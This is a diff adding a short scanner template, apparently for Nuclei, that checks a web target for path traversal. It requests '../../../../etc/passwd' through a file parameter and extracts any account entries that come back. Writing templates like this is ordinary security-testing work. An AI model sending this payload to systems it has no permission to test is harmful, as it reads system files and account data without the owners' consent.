@@ -1,0 +1,20 @@
+id: nawab-lfi-pwn
+info:
+  name: Confirmed Path Traversal
+  author: thenawabx
+  severity: critical
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+    extractors:
+      - type: regex
+        name: passwd_content
+        regex:
+          - "[a-z_][a-z0-9_-]*:x:[0-9]*:[0-9]*"
